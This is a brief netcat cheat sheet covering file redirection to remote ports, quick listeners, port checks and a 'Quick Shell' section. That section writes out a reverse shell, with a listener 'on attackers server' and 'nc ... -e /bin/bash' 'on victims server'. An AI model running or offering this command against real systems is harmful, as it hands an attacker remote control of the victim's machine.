Netcat - Redirect file or HTTP header to a remote port
-------------------------------------------
UDP redirect file to port 37
```
nc -v -u xxx.xxx.xxx.xxx 37 < ./file.txt
```
TCP redirect file to port 80
```
nc xxx.xxx.xxx.xxx 80 < ./file.txt
```
TCP redirect http post-headers to port 80
```
nc xxx.xxx.xxx.xxx 80 < ./post-headers.txt
```

Netcat - Quick Listener
-------------------------------------------
Start Listener
```
nc -l 3333
```
Connect to Listener
```
nc xxx.xxx.xxx.xxx 3333
```

Netcat - Quick Shell
-------------------------------------------
On attackers server
```
nc -lvvnp 1337
```
On victims server
```
nc <attackers server ip> 1337 -e /bin/bash
```

Netcat - Check if a port is open
-------------------------------------------
TCP
```
nc -z -v xxx.xxx.xxx.xxx <portnumber>
```
UDP
```
nc -z -v -u xxx.xxx.xxx.xxx <portnumber>
```
